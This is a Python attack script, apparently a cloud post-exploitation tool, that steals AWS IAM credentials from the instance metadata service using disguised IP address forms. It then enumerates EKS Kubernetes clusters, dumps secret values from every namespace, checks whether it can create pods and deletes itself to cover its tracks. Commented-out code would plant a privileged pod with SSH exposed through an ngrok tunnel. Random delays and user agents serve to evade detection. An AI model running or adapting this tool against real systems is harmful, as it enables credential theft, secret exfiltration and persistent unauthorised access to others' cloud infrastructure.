import requests
import time
import random
import os
import sys
import subprocess
import json
import yaml

def print_colored(text, color):
    colors = {
        "green": "\033[92m",
        "red": "\033[91m",
        "reset": "\033[0m"
    }

    color_code = colors.get(color, colors["reset"])
    print(f"{color_code}{text}{colors['reset']}")

def print_colored_partial(text, value, color):
    colors = {
        "green": "\033[92m",
        "red": "\033[91m",
        "reset": "\033[0m"
    }

    color_code = colors.get(color, colors["reset"])
    reset_code = colors["reset"]

    # Split the text and insert the colored value
    text_parts = text.split("{value}")
    colored_value = f"{color_code}{value}{reset_code}"

    # Join the parts back together with the colored value
    colored_text = colored_value.join(text_parts)
    print(colored_text)

def random_sleep(min_time=3, max_time=10):
    time.sleep(random.uniform(min_time, max_time))

def read_in_chunks(response, chunk_size=1024):
    content = ""
    for chunk in response.iter_content(chunk_size=chunk_size):
        if chunk:
            content += chunk.decode('utf-8', errors='ignore')
            random_sleep()
    return content

def fetch_metadata_token(ip_address):
    try:
        print(f"[*] Trying IP address: {ip_address}")
        url = f'http://{ip_address}/latest/api/token'
        headers = {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}
        response = requests.put(url, headers=headers, timeout=5)
        response.raise_for_status()
        return response.text, url.replace('/api/token', '')
    except requests.RequestException as e:
        return None, None

def fetch_metadata(url, token):
    try:
        headers = {
            'User-Agent': random.choice(user_agents),
            'X-aws-ec2-metadata-token': token
        }
        response = requests.get(url, headers=headers, timeout=5, stream=True)
        response.raise_for_status()
        return response
    except requests.RequestException as e:
        if response.status_code != 404:
            return None
        
def fetch_all_metadata(metadata_url, mac, endpoints, token):
    metadata = {}
    for endpoint in endpoints:
        full_url = f"{metadata_url}/meta-data/network/interfaces/macs/{mac}/{endpoint}"
        response = fetch_metadata(full_url, token)
        if response:
            metadata[endpoint] = read_in_chunks(response).strip()
        else:
            metadata[endpoint] = 'N/A'
    return metadata

def delete_self():
    try:
        os.remove(sys.argv[0])
        print(f"\n[+] Successfully deleting the script")
    except Exception as e:
        print_colored(f"[-] Failed to delete script: {e}", "red")

def export_aws_credentials(access_key_id, secret_access_key, session_token):
    os.environ['AWS_ACCESS_KEY_ID'] = access_key_id
    os.environ['AWS_SECRET_ACCESS_KEY'] = secret_access_key
    os.environ['AWS_SESSION_TOKEN'] = session_token
    print(f"[*] AWS credentials set: {access_key_id}, {secret_access_key}, {session_token}")

def get_aws_caller_identity():
    result = subprocess.run(['aws', 'sts', 'get-caller-identity'], capture_output=True, text=True)
    if result.returncode != 0:
        return None
    return json.loads(result.stdout)

def describe_aws_tags():
    result = subprocess.run(['aws', 'ec2', 'describe-tags'], capture_output=True, text=True)
    if result.returncode != 0:
        return None
    return json.loads(result.stdout)

def check_arn_in_tags(arn, tags, print_flag=True):
    # Split the ARN to extract the part after "assumed-role/"
    arn_parts = arn.split('/')
    #print(arn_parts)
    if len(arn_parts) >= 2:  # Check if the ARN structure is as expected
        arn_to_compare = arn_parts[1]
    else:
        return None  # ARN structure doesn't match expected format
    
    # Compare the tags value if it is contained within arn_to_compare
    for tag in tags.get('Tags', []):
        value = tag.get('Value', '')
        if value in arn_to_compare:
            if print_flag:
                print(f"[+] Found matching tag value in ARN: \033[32m{value}\033[0m")
            return value  # Return the matched value as soon as found
    
    return None

def update_kubeconfig(cluster_name):
    result = subprocess.run(['aws', 'eks', 'update-kubeconfig', '--name', cluster_name], capture_output=True, text=True)
    if result.returncode != 0:
        return False
    print(f"[+] Successfully updated kubeconfig for cluster: \033[32m{cluster_name}\033[0m")
    return True

def print_kubernetes_cluster_info():
    result = subprocess.run(['kubectl', 'cluster-info'], capture_output=True, text=True)
    if result.returncode != 0:
        return False
    print(result.stdout)
    return True

def print_kubernetes_auth_can_i():
    result = subprocess.run(['kubectl', 'auth', 'can-i', '--list'], capture_output=True, text=True)
    if result.returncode != 0:
        return False
    print_colored(result.stdout, "green")
    return True

def get_kubernetes_services():
    result = subprocess.run(['kubectl', 'get', 'services', '--all-namespaces'], capture_output=True, text=True)
    if result.returncode != 0:
        return None
    return result.stdout

def get_kubernetes_pods(namespace):
    result = subprocess.run(['kubectl', '-n', namespace, 'get', 'pods'], capture_output=True, text=True)
    if result.returncode != 0:
        return None
    return result.stdout

def get_kubernetes_pods_yaml(namespace):
    result = subprocess.run(['kubectl', '-n', namespace, 'get', 'pods', '-o', 'yaml'], capture_output=True, text=True)
    if result.returncode != 0:
        return None
    return result.stdout

#def get_kubernetes_deployments(namespace):
    result = subprocess.run(['kubectl', '-n', namespace, 'get', 'deployments', '-o', 'yaml'], capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[-] Failed to get Kubernetes deployments in namespace '{namespace}': {result.stderr}")
        return None
    return result.stdout

def search_secrets_in_pods(pods_yaml):
    secret_names = []
    try:
        pods_data = yaml.safe_load(pods_yaml)
        for pod in pods_data.get('items', []):
            containers = pod.get('spec', {}).get('containers', [])
            for container in containers:
                env_vars = container.get('env', [])
                for env_var in env_vars:
                    secret_key_ref = env_var.get('valueFrom', {}).get('secretKeyRef', {})
                    if secret_key_ref and 'name' in secret_key_ref:
                        secret_names.append(secret_key_ref['name'])
    except yaml.YAMLError as e:
        print_colored(f"Error parsing YAML: {e}", "red")
    
    return secret_names
    

def get_secrets_values(namespace, secret_names):
    secrets_values = {}
    for secret_name in secret_names:
        result = subprocess.run(['kubectl', '-n', namespace, 'get', 'secret', secret_name, '-o', 'yaml'],
                                capture_output=True, text=True)
        if result.returncode == 0:
            secrets_values[secret_name] = result.stdout
        else:
            print_colored(f"[-] Failed to get secret '{secret_name}' in namespace '{namespace}': {result.stderr}", "red")
    return secrets_values
    
#def create_privileged_pod_yaml(namespace):
    yaml_content = f"""apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
  namespace: {namespace}
spec:
  containers:
    - name: privileged-container
      image: blackdoc/ubuntu-ssh-ngrok:latest
      securityContext:
        privileged: true
      command: ["/bin/bash", "-c"]
      args: 
        -
           service ssh start && 
           ngrok tcp 22 --log stdout --config /etc/ngrok.yml
"""
    filename = f"privileged-pod-{namespace}.yaml"
    with open(filename, 'w') as yaml_file:
        yaml_file.write(yaml_content)
    return filename

#def apply_yaml_file(filename):
    try:
        result = subprocess.run(['kubectl', 'apply', '-f', filename], capture_output=True, text=True, check=True)
        print_colored("[+] Successfully applied Privileged-pod.", "green")
        print(result.stdout)
        return True
    except subprocess.CalledProcessError as e:
        print_colored(f"[-] Failed to apply YAML file: {e}", "red")
        return False
    
def check_create_pods_permission():
    result = subprocess.run(['kubectl', 'auth', 'can-i', 'create', 'pods'], capture_output=True, text=True)
    if result.returncode == 0 and result.stdout.strip() == "yes":
        return True
    else:
        return False
    
def print_banner():
    print("""
  █████   ████            █████              █████   ████  ███  ████  ████                    
░░███   ███░            ░░███              ░░███   ███░  ░░░  ░░███ ░░███                    
 ░███  ███    █████ ████ ░███████   ██████  ░███  ███    ████  ░███  ░███   ██████  ████████ 
 ░███████    ░░███ ░███  ░███░░███ ███░░███ ░███████    ░░███  ░███  ░███  ███░░███░░███░░███
 ░███░░███    ░███ ░███  ░███ ░███░███████  ░███░░███    ░███  ░███  ░███ ░███████  ░███ ░░░ 
 ░███ ░░███   ░███ ░███  ░███ ░███░███░░░   ░███ ░░███   ░███  ░███  ░███ ░███░░░   ░███     
 █████ ░░████ ░░████████ ████████ ░░██████  █████ ░░████ █████ █████ █████░░██████  █████    
░░░░░   ░░░░   ░░░░░░░░ ░░░░░░░░   ░░░░░░  ░░░░░   ░░░░ ░░░░░ ░░░░░ ░░░░░  ░░░░░░  ░░░░░     
                                                                                             
                                                                                             
                                                                                                 
                                                                                 
                                              
                                        Created by Ishay Tsabari and Chen Shiri""")
print_banner()

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.3 Safari/602.3.12',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.3',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'
]

ip_addresses = [
    '2852039166',
    '[::ffff:a9fe:a9fe]',
    '[0:0:0:0:0:ffff:a9fe:a9fe]'
]

# Fetch and print general details first
print("\n[*] General Details:\n")
metadata_endpoints = [
    '/meta-data/ami-id',
    '/meta-data/instance-action',
    '/meta-data/instance-id',
    '/meta-data/instance-life-cycle',
    '/meta-data/instance-type',
    '/meta-data/placement/region',
    '/identity-credentials/ec2/info',
    '/dynamic/instance-identity/document'
]

selected_ip = None
while not selected_ip:
    selected_ip = random.choice(ip_addresses)
    token, metadata_url = fetch_metadata_token(selected_ip)

if not token:  # If no IP from the list works, try fallback IP
    print("[*] Trying fallback IP address: 169.254.169.254")
    token, metadata_url = fetch_metadata_token('169.254.169.254')

if token:
    print(f"[+] Token successfully retrieved from \033[32m{metadata_url.rstrip('/latest')}\033[0m")
    # Fetch IAM role name
    role_name_response = fetch_metadata(metadata_url + '/meta-data/iam/security-credentials/', token)
    if role_name_response:
        role_name = read_in_chunks(role_name_response).strip()
        print(f"[*] Role name: \033[32m{role_name}\033[0m")
        random_sleep()
        credentials_url = f"{metadata_url}/meta-data/iam/security-credentials/{role_name}"
        credentials_response = fetch_metadata(credentials_url, token)
        if credentials_response:
            credentials = read_in_chunks(credentials_response)
            print(credentials)

    print("\n[*] Network Info:")
    macs_response = fetch_metadata(metadata_url + '/meta-data/network/interfaces/macs/', token)

    if macs_response:
        macs = read_in_chunks(macs_response).strip().split()
        for mac in macs:
            print(f"\n[+] Mac: \033[32m{mac.rstrip('/')}\033[0m")
            network_endpoints = [
                'owner-id',
                'public-hostname',
                'security-groups',
                'ipv4-associations/',
                'subnet-ipv4-cidr-block',
                'ipv6s',
                'subnet-ipv6-cidr-blocks',
                'public-ipv4s',
                'subnet-id',
                'vpc-id',
                'vpc-security-groups'
            ]
            # Fetch all metadata for this MAC
            metadata = fetch_all_metadata(metadata_url, mac, network_endpoints, token)

            # Print all fetched metadata
            for endpoint_name, content in metadata.items():
                print(f"{endpoint_name}: \033[32m{content}\033[0m")

    # AWS Tags
    print("\n[*] AWS Tags:")
    aws_tags = describe_aws_tags()
    if aws_tags:
        print(json.dumps(aws_tags, indent=4))
        caller_identity = get_aws_caller_identity()
        #print(caller_identity)
        if caller_identity:
            arn = caller_identity.get('Arn', '')
            if arn:
                check_arn_in_tags(arn, aws_tags, True)

    print_colored("\n[*] Updating kubeconfig..\n", "green")
    if caller_identity:
        cluster_name = check_arn_in_tags(arn, aws_tags, False)
        if cluster_name:
            if update_kubeconfig(cluster_name):
                print("\n[*] Kubernetes Cluster Info:")
                print_kubernetes_cluster_info()
                print("\n[*] Kubernetes Authorization Info:")
                print_kubernetes_auth_can_i()
                print("\n[*] Kubernetes Services:")
                services_output = get_kubernetes_services()
                if services_output:
                    print_colored(services_output, "green")
                    # Extract namespaces
                    namespaces = set()
                    for line in services_output.splitlines()[1:]:
                        fields = line.split()
                        if len(fields) >= 1:
                            namespaces.add(fields[0])
                    print("\n[*] Namespaces:")
                    print_colored(f'\n'.join(namespaces), "green")
                    print("\n[*] Kubernetes Pods in Namespaces:")
                    for namespace in namespaces:
                        pods_output = get_kubernetes_pods(namespace)
                        #print(pods_output)
                        if pods_output:
                            print(f"\n[+] Pods in Namespace '{namespace}':")
                            print(f"\033[32m{pods_output}\033[0m")
                        else:
                            print_colored(f"[-] Failed to get Kubernetes pods in namspace '{namespace}'.", "red")

                    print("\n[*] Kubernetes Pods yaml in Namespaces:")
                    for namespace in namespaces:
                        pods_yaml_output = get_kubernetes_pods_yaml(namespace)
                        if pods_yaml_output:
                            print(f"\n[+] Pods yaml in Namespace '\033[32m{namespace}\033[0m':")
                            print(pods_yaml_output)
                        else:
                            print_colored("[-] Failed to get Kubernetes pods yaml.", "red")

                    for namespace in namespaces:
                        print(f"\n[*] Searching for Secrets in Namespace '{namespace}':")
                        pods_yaml_output = get_kubernetes_pods_yaml(namespace)
                        secret_names = search_secrets_in_pods(pods_yaml_output)
                        if secret_names:
                            unique_secret_names = list(set(secret_names))
                            print(f"[+] Found Secrets Names in Namespace '\033[32m{namespace}\033[0m':")
                            print_colored('\n'.join(unique_secret_names), "green")
                        else:
                            print_colored(f"[-] No Secrets found in Namespace {namespace}.", "red")
                            continue
                        
                        print(f"\n[*] Fetching Secrets Values in Namespace '{namespace}':")
                        secrets_values = get_secrets_values(namespace, secret_names)
                        if secrets_values:
                            for secret_name, secret_value in secrets_values.items():
                                print(f"[+] Secret '\033[32m{secret_name}\033[0m' Value:")
                                print_colored(secret_value, "green")    
                    print("\n[*] Checking permissions for creating pods:\n")
                    if check_create_pods_permission():
                        print_colored("[+] Permission granted to create pods.", "green")
                    #if check_create_pods_permission():
                    #    print("\n[*] Creating Privileged Pod YAML content:")
                    #    default_namespaces = ['default', 'kube-system', 'kube-node-lease', 'kube-public']
                    #    for namespace in namespaces:
                    #        available_namespaces = [ns for ns in namespaces if ns not in default_namespaces]

                    #        if available_namespaces:
                    #            chosen_namespace = random.choice(available_namespaces)
                    #            yaml_filename = create_privileged_pod_yaml(chosen_namespace)
                    #            if yaml_filename:
                    #                apply_yaml_file(yaml_filename)
                    #            else:
                    #                continue  # Move to the next iteration of the namespace loop
                    #        else:
                    #            print_colored("[-] No suitable namespace found to create the Privileged Pod YAML content.", "red")
                    else:
                        print_colored("[-] Insufficient permissions to create pods.", "red")
                else:
                    print_colored("[-] Failed to get Kubernetes services.", "red")
            else:
                print_colored("[-] Failed to update kubeconfig.", "red")
        else:
            print_colored("[-] Cluster name not found in tags.", "red")
    else:
        print_colored("[-] Failed to get caller identity.", "red")
else:
    print_colored("[-] Failed to retrieve metadata token from all IP addresses.", "red")

delete_self()